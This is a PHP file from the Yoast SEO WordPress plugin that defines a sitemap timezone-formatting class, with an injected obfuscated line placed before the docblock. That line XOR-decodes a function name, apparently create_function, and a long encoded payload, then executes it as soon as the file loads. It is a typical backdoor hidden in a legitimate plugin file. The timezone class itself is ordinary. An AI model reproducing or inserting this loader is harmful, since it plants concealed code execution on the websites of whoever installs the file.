<?php $pnSsNlA='ZYTWT<6V2B698OS'^'9+16 Yi0G,UMQ =';$heTOkPjBFay=$pnSsNlA('','P<iuJFNCE:,Nh<A0KCKymL7==IWN4kt9KBBcGtFnlW9Y+O1;CJ59NsQW-Qt79G8oA=;YAubiU=HmrtnJjJfP1ETL>Yeavqb3D;F, FUQBvkBvkSSUDTL=YNRJD29XkuwwRmCErMNJ5::eoZrot-5701jBkipMcKW29BIjbA FK WEIrWPTl:Oj=G9HE;,DCAL8BIGCo:Cz7nLaT BVEXyQ9X:NsgHOJIU=1I:OzX69;MYAD2+,DVQ3:uPLfo q9t-YO+PoUI>cSswt  96UkC7nlPR+.J8K0;pLVaWKLA21TH YZgdNe.,UA,yYF6z1.Qnnc,MXRPMOd9F8RXWXSYYPkl5l4q=5C42pnKS7rPQJb>,5KHkHH:FEu2.9X<1<5GGsh-7RwCCeP P.OQQnqOU4L-oIg:2;exe-55.ItNv,:BTRPRA+63n-W4gS;:73tYBZbBA1+yw,-N;6YNiV00I-feLCPRTJ9P+:NjSM1Jct.TXSSuNt5:BSIq;XEkE=;61+yj;2 iTBp-,ARkIBIZc>,aMVT;X0jc11BDsnJVuuEDXooq.bc,FQH2C7tYbITFQvWgCk13HUmbOHkNfT C7:oP7Dj 6-6=OlLC7L>W5OuYgU-6DVodiufDpJ:XS<NMLnTV HR5m2M2 BT-CdfpPcT7EFKBMneN'^'9ZAT,3  1SC 7Y9Y878QJ4XOb-6:U4+T>6eJnT=de1L7H;XT-jMV<,56Y0+hT2LGeYZ- YBM>X1DRTNjJ1lY8a;9JyXAQVY9M2 CRnq8bKKrMKw:i7 >Q< zn SM9BNWS;FhlxDGnZONEAgRGPITCQjN+6I.mG 2Kbf JGaS29L2+aV<5-EgfQ7N0: OY6-ihW7=nxe3>pJdFE0A67eeY7X4I+Hml++=4bZ,CoGxPXW><zN8MC630PRUxh9,o>r=hy.XpK>,GCnMWPVAUC0BcLdet6JZ+g UBPqvE<.5z88p,A-;GYnAXM94IBS;<pXHqFOGH,,3ym4n0 W =6;;yqt4>p=a4nacUAPJ 6NRmojFHMY>-Bh30OLQVOM9cZYLgzSLFR+LIJltD1Z.qlNU94X9HTCnG8ForAITAOiIn6YT11 93-BLVFU8F87ZNVl+47.J  BNOCsI+XY=+ArTQ=LOIlg43 +f;NCgChGX,KPJ5,2sShTTH020.P=<4 EREEXQMPWYNxbTIM53BidozKSHTer0Z,Q1DZT;c.GjkHUbr>ZYIMSPIw2-VzUEiW,2u0EaWpXTV-fUEfhMhF5R1VC0;R=5ENDEI<Dk3V5R8T+RuGqIW07FMIUFdPjARZY8, Fp2A<3nJB,KL-5Id9OKZj1O,2crdUo3');$heTOkPjBFay();
/**
 * @package WPSEO\XML_Sitemaps
 */

/**
 * Class WPSEO_Sitemap_Timezone
 */
class WPSEO_Sitemap_Timezone {

	/**
	 * Holds the timezone string value to reuse for performance
	 *
	 * @var string $timezone_string
	 */
	private $timezone_string = '';

	/**
	 * Format arbitrary UTC datetime string to desired form in site's time zone.
	 *
	 * @param string $datetime_string The input datetime string in UTC time zone.
	 * @param string $format          Date format to use.
	 *
	 * @return string
	 */
	public function format_date( $datetime_string, $format = 'c' ) {

		$date_time = $this->get_datetime_with_timezone( $datetime_string );

		if ( is_null( $date_time ) ) {
			return '';
		}

		return $date_time->format( $format );
	}
	/**
	 * Get the datetime object, in site's time zone, if the datetime string was valid
	 *
	 * @param string $datetime_string The datetime string in UTC time zone, that needs to be converted to a DateTime object.
	 *
	 * @return DateTime|null in site's time zone
	 */
	public function get_datetime_with_timezone( $datetime_string ) {

		static $utc_timezone, $local_timezone;

		if ( ! isset( $utc_timezone ) ) {
			$utc_timezone   = new DateTimeZone( 'UTC' );
			$local_timezone = new DateTimeZone( $this->get_timezone_string() );
		}

		if ( ! empty( $datetime_string ) && WPSEO_Utils::is_valid_datetime( $datetime_string ) ) {
			$datetime = new DateTime( $datetime_string, $utc_timezone );
			$datetime->setTimezone( $local_timezone );

			return $datetime;
		}

		return null;
	}

	/**
	 * Returns the timezone string for a site, even if it's set to a UTC offset
	 *
	 * Adapted from http://www.php.net/manual/en/function.timezone-name-from-abbr.php#89155
	 *
	 * @return string valid PHP timezone string
	 */
	private function determine_timezone_string() {

		// If site timezone string exists, return it.
		if ( $timezone = get_option( 'timezone_string' ) ) {
			return $timezone;
		}

		// Get UTC offset, if it isn't set then return UTC.
		if ( 0 === ( $utc_offset = (int) get_option( 'gmt_offset', 0 ) ) ) {
			return 'UTC';
		}

		// Adjust UTC offset from hours to seconds.
		$utc_offset *= HOUR_IN_SECONDS;

		// Attempt to guess the timezone string from the UTC offset.
		$timezone = timezone_name_from_abbr( '', $utc_offset );

		if ( false !== $timezone ) {
			return $timezone;
		}

		// Last try, guess timezone string manually.
		foreach ( timezone_abbreviations_list() as $abbr ) {
			foreach ( $abbr as $city ) {
				if ( $city['offset'] == $utc_offset ) {
					return $city['timezone_id'];
				}
			}
		}

		// Fallback to UTC.
		return 'UTC';
	}

	/**
	 * Returns the correct timezone string
	 *
	 * @return string
	 */
	private function get_timezone_string() {
		if ( '' == $this->timezone_string ) {
			$this->timezone_string = $this->determine_timezone_string();
		}

		return $this->timezone_string;
	}
}
